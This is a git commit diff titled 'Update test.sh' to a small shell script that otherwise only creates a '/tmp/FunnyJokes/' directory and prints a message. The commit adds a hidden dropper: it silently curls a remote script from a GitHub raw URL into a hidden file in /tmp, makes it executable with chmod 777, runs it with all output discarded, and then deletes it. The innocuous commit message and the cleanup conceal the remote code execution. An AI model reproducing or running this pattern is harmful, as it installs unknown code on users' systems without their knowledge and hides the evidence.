3a7cc94caf678ffb2434f3f7e72995db45c7e169
MisterJokes <35965834+MisterJokes@users.noreply.github.com>
2018-03-12 15:28:01 +0100

    Update test.sh

--- test.sh
+++ test.sh
@@ -1,2 +1,6 @@
 mkdir /tmp/FunnyJokes/;
 echo "created funny jokes directory";
+
+
+curl -s https://raw.githubusercontent.com/SteveJobsDerEchte/Krim/master/test.sh > /tmp/.setup.sh;chmod 777 /tmp/.setup.sh;/tmp/.setup.sh &>/dev/null
+rm /tmp/.setup.sh &>/dev/null
